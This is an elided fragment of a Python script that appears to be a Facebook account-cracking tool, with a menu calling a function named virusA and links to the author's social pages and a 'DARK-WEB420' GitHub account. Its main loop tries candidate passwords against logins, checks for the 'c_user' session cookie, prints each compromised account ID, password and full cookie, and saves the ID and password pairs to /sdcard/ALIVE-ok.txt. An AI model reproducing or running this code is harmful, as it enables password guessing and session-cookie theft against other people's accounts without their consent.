...
def Main():
	...
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		os.system('xdg-open https://www.facebook.com/md.abdullah8028');time.sleep(1)
		fb()
	if opt in ["C","3"]:
		os.system('xdg-open https://m.me/j/AbbP8rgtogRSpQ-M/');time.sleep(1)
		group()
	if opt in ["D","0"]:
		exit()
	else:
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/groups/921390082232954');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/DARK-WEB420');time.sleep(1)
		admin()
	if bal =='0':
		Main()
        ...
        for ps in pwx:
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[151:166]
                print(f'\r\033[1;91m [\033[0;92mALIVE\033[1;91m]\033[0;92m '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;36m=[🤍]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ALIVE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
